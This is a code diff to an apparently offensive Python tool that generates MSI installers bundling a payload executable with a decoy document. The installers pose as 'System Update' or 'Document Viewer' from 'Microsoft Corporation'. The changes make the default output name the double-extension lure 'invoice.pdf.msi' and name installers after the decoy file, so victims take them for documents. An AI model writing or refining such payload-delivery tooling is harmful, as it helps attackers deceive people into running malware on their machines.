@@ -13,7 +13,7 @@ def create_msi_trigger(
     payload_exe: str,
     decoy_file: str,
     payload_dir: pathlib.Path = None,
-    output_filename: str = "invoice.msi",
+    output_filename: str = None,
     product_name: str = "System Update",
     manufacturer: str = "Microsoft Corporation"
 ) -> pathlib.Path:
@@ -23,11 +23,14 @@ def create_msi_trigger(
     if payload_dir is None:
         payload_dir = PAYLOAD_DIR
 
+    if output_filename is None:
+        output_filename = "invoice.pdf.msi"
+
     msi_output_path = payload_dir / output_filename
-    
+
     payload_filename = pathlib.Path(payload_exe).name
     decoy_filename = pathlib.Path(decoy_file).name
-    
+
     wxs_content = f"""<?xml version='1.0' encoding='windows-1252'?>
 <Wix xmlns='http://schemas.microsoft.com/wix/2006/wi'>
   <Product Name='{product_name}' Id='*' UpgradeCode='12345678-1234-1234-1234-111111111111'
@@ -44,7 +47,7 @@ def create_msi_trigger(
       <Directory Id='AppDataFolder' Name='AppData'>
         <Directory Id='INSTALLDIR' Name='{product_name}'>
            <Component Id='MainComponent' Guid='*'>
-             <RegistryValue Root='HKCU' Key='Software\\{manufacturer}\\{product_name}' Name='installed' Type='integer' Value='1' KeyPath='yes'/>
+             <RegistryValue Root='HKCU' Key='Software\\\\{manufacturer}\\\\{product_name}' Name='installed' Type='integer' Value='1' KeyPath='yes'/>
            </Component>
         </Directory>
       </Directory>
@@ -104,11 +107,13 @@ def create_msi_payload_trigger(
 
     if decoy_file is None:
         decoy_file = DECOY_FILE
-        
+
+    output_filename = f"{decoy_file.name}.msi"
+
     return create_msi_trigger(
         payload_exe=payload_exe,
         decoy_file=decoy_file.name,
         payload_dir=payload_dir,
         product_name="Document Viewer",
-        output_filename=f"{decoy_file.name}.msi"
+        output_filename=output_filename 
     )
